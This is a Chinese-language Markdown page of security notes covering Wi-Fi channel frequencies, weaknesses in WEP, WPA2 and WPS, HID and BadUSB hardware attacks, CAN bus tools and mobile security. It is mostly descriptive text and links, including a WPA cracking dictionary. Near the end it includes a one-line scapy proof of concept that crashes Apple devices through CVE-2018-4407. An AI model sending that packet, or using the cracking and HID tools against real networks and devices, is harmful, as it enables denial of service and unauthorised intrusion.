- 5 GHz 802.11a/c 频段可以具有 7 到 165 个信道以及它们各自的信道的频率范围从 5035 至 5825
    |信道   |频率
    |-------|----------
    |7	    |5035
    |8	    |5040
    |9	    |5045
    |11	    |5055
    |12	    |5060
    |16	    |5080
    |32	    |5160
    |34	    |5170
    |36	    |5180
    |38	    |5190
    |40	    |5200
    |42	    |5210
    |44	    |5220
    |46	    |5230
    |48	    |5240
    |50	    |5250
    |52	    |5260
    |54	    |5270
    |56	    |5280
    |58	    |5290
    |60	    |5300
    |62	    |5310
    |64	    |5320
    |68	    |5340
    |96	    |5480
    |100	|5500
    |102	|5510
    |104	|5520
    |106	|5530
    |108	|5540
    |110	|5550
    |112	|5560
    |114	|5570
    |116	|5580
    |118	|5590
    |120	|5600
    |122	|5610
    |124	|5620
    |126	|5630
    |128	|5640
    |132	|5660
    |134	|5670
    |136	|5680
    |138	|5690
    |140	|5700
    |142	|5710
    |144	|5720
    |149	|5745
    |151	|5755
    |153	|5765
    |155	|5775
    |157	|5785
    |159	|5795
    |161	|5805
    |165	|5825
    |169	|5845
    |173	|5865
    |183	|4915
    |184	|4920
    |185	|4925
    |187	|4935
    |188	|4940
    |189	|4945
    |192	|4960
    |196	|4980
    具体详见: https://en.wikipedia.org/wiki/List_of_WLAN_channels
**无线安全协议**
- WEP
    使用流密码 RC4 来确保机密性,很不安全
    - 由于初始化向量的熵大小较弱,因此有可能对密钥进行猜测攻击
    - 此安全协议的另一个缺陷是完整性检查,它可以使攻击者伪造数据包并生成 IV
    - 可以针对此安全性进行攻击的类型主要有两种:ChopChop 和 Fragmentation 攻击;两种攻击的主要目的是检索 PRGA 并将数据包伪造回接入点
- WPA2
    WPA2 PSK 相比 WEP 更安全,主要用于家庭路由器
    - 变体：WPA TKIP,WPA2 AES,WPA2 TKIP + AES
    - TKIP - 时间密钥完整性协议
    - 64位消息完整性检查(MIC)L
    - 为了防止简单的重放攻击,使用了序列计数器(TSC),该计数器仅允许数据包按顺序到达接收器
    - AES - 高级加密标准
    - 可以捕获客户端和访问点之间的身份验证握手
    - WPA2 仍然容易受到爆破攻击
- WPA2 Enterprise(企业)
    - 使用身份验证服务器控制对无线网络的访问
    - 客户端需要通过身份验证服务器进行自我验证
    - 利用证书颁发机构来验证用户的合法性
    - 无线网络的接入点与最弱的用户一样强大(The access point to wireless network is as strong as the weakest users)
    - 可以通过 Evil Twin WPA2 Enterprise 网络对 CA 配置错误的访问点进行攻击,并捕获质询和响应
- WPS
    WPS - WiFi 保护设置主要用于路由器和客户端之间,以更快地建立连接
    - 如果配置错误,很容易被入侵
    - 仅包含8位数字,在身份验证期间,将8位数字分为2部分,并且每4位一次验证,4位数字可以被10000次尝试爆破出来
**相关工具**
- **Aircrack**
    - [Aircrack 笔记](./安全工具/aircrack.md)
**相关资源**
- [conwnet/wpa-dictionary](https://github.com/conwnet/wpa-dictionary) - WPA/WPA2 密码字典，用于 wifi 密码暴力破解
---
### 硬件安全
**漏洞记录**
- [Device-Exploits](./IOT/硬件安全/Device-Exploits.md)
#### HID
> HID 全称为 Human Interface Device 直译为人类接口设备，也被称为人体学输入设备，是指与人类直接交互的计算机设备，而 pc 端上的”HID”一般指的是 USB-HID 标准，更多指微软在 USB 委员会上提议创建的一个人体学输入设备工作组。HID attack 通过插入带有攻击向量的USB设备等方式，恶意代码直接就被加载执行，攻击操作也就瞬时发生。此类方式属于物理层面攻击。
**BadUSB**
> BADUSB 是2014年黑客大会上由柏林 SRLabs 的安全研究人员 JakobLell 和独立安全研究人员 Karsten Nohl 展示攻击方法，该攻击方法通过对普通u盘的固件进行逆向重新编程，修改了u盘的系统，然后进行攻击。
- [低成本玩转硬件安全（一）：BadUSB on Arduino](http://www.freebuf.com/geek/127601.html)
- [BadUSB插谁谁怀孕](https://h4rdy.me/index.php/archives/58/)
- [插入U盘自动攻击：BadUSB原理与实现](https://www.freebuf.com/articles/terminal/53886.html)
**Digispark**
> Digispark 是一个基于 ATTINY85 微控制器的 USB 开发板，体积小且价钱便宜，功能方面则没有 Arduino 般强大。代码与 Arduino 大同小异，更可贵的是使用 Arduino IDE 来开发。
- [HID-Digispark](./IOT/硬件安全/HID/HID-Digispark.md)
**USB-Rubber-Ducky**
> USB RUBBER DUCKY 简称 usb 橡皮鸭，是最早的按键注入工具，可根据对应要求定制硬件。
- [利用USB RUBBER DUCKY（USB 橡皮鸭）在目标机器上启动Empire或Meterpreter会话](http://www.freebuf.com/geek/141839.html)
- [hak5darren/USB-Rubber-Ducky](https://github.com/hak5darren/USB-Rubber-Ducky)
**Teensy**
> Teensy 是拥有芯片且功能完整的单片机开发系统。可模拟键盘和鼠标。经开发的 teensy usb 设备可被电脑识别成键盘或鼠标，然后执行编程进去的恶意代码。价格亲民，开源性强可和kali配合使用。
- [关于HID攻击介绍](https://www.freebuf.com/column/181090.html)
- [HID攻击之TEENSY实战](http://blog.topsec.com.cn/hid%e6%94%bb%e5%87%bb%e4%b9%8bteensy%e5%ae%9e%e6%88%98/)
**USBkiller**
- [USB killer](https://habr.com/post/251451/)
- [This $3 DIY USB Device Will Kill Your Computer](https://hackernoon.com/this-3-diy-usb-device-will-kill-your-computer-33c4bdb1da40)
**USBKeylogger**
> 一个基于 ESP8266+CH9350 的键盘记录器，且带有 Wi-Fi 功能，可以存储记录到的键盘输入，并可以通过其发出的 Wi-Fi 网络，在手机端查看记录到的用户键入数据。
- [HID-USBKeylogger](./IOT/硬件安全/HID/HID-USBKeylogger.md)
**USBHarpoon**
> 通过USBHarpoon，安全专家用充电线取代了USB驱动器，由于充电线太过常见且运用频繁，所以用户可能会对其放松警惕，攻击也就更容易顺利实现。
- [HID-USBHarpoon](./IOT/硬件安全/HID/HID-USBHarpoon.md)
---
### 固件安全
- [固件安全](./IOT/固件安全/固件安全.md)
---
### IIOT
#### 自动化
**相关案例**
- [格物实验室：KUKA 机器人安全分析实战](http://blog.nsfocus.net/kuka-0803/)
#### CAN
**安全资源**
- [jaredthecoder/awesome-vehicle-security](https://github.com/jaredthecoder/awesome-vehicle-security)
- [newaetech/CANoodler](https://github.com/newaetech/CANoodler)
**相关文章**
- [如何使用Metasploit进行汽车安全性测试？](https://www.freebuf.com/articles/system/189293.html)
- [物联网安全实战从零开始-CAN总线协议初探](https://mp.weixin.qq.com/s/kfCtodlW1giw723L694weA)
- [Hacking All The Cars之CAN总线逆向](https://bacde.me/post/hacking-all-the-cars-can-bus-reverse/)
**仿真工具**
- [zombieCraig/ICSim](https://github.com/zombieCraig/ICSim) - ICSim 可以产生多个CAN信号，同时会产生许多背景噪声，让我们可以在没有汽车或不改造汽车的情况下即可练习CAN总线的逆向技术。ICSim 包括一个带有车速表、门锁指示灯、转向信号灯和控制面板的仪表板。模拟控制器允许用户与模拟汽车网络进行交互，应用加速、刹车、控制门锁和转向信号。
**通信工具**
- [linux-can/can-utils](https://github.com/linux-can/can-utils) - Can-utils 是一组 Linux 实用程序，允许 Linux 与车载 CAN 网络进行通信。
    ```
    apt install can-utils
    ```
- [CANToolz/CANToolz](https://github.com/CANToolz/CANToolz) - Black-box CAN network analysis framework
- [collin80/SavvyCAN](https://github.com/collin80/SavvyCAN) - QT based cross platform canbus tool
- [dschanoeh/Kayak](https://github.com/dschanoeh/Kayak) - Kayak is a CAN bus analysis tool based on SocketCAN
---
## MobileSec
> 移动安全这块内容我不是很懂,稍微收集一些,可能分类不准确
**相关工具**
- [MobSF/Mobile-Security-Framework-MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) - 一个自动化的、一体化的移动应用程序(安卓/iOS/Windows)测试、恶意软件分析和安全评估框架，能够执行静态和动态分析。
    ```
    注: 安装的时候不能走国内 pip 源,特别是清华源,会直接报错
    ```
### Android
- [Android安全](./MobileSec/Android安全.md)
### IOS
**CVE-2018-4407**
- 相关文章
    - [远程打挂所有的 apple 设备 — CVE-2018-4407 分析](https://mabin004.github.io/2018/11/01/%E8%BF%9C%E7%A8%8B%E6%89%93%E6%8C%82%E6%89%80%E6%9C%89%E7%9A%84apple%E8%AE%BE%E5%A4%87-CVE-2018-4407-%E5%88%86%E6%9E%90/)
- POC | Payload | exp
    ```bash
    $scapy
    >>send(IP(dst="192.168.1.151",options=[IPOption("A"*8)])/TCP(dport=8888,options=[(19, "1"*33)]))
    ```
### 小程序安全
- [小程序安全](./MobileSec/小程序安全.md)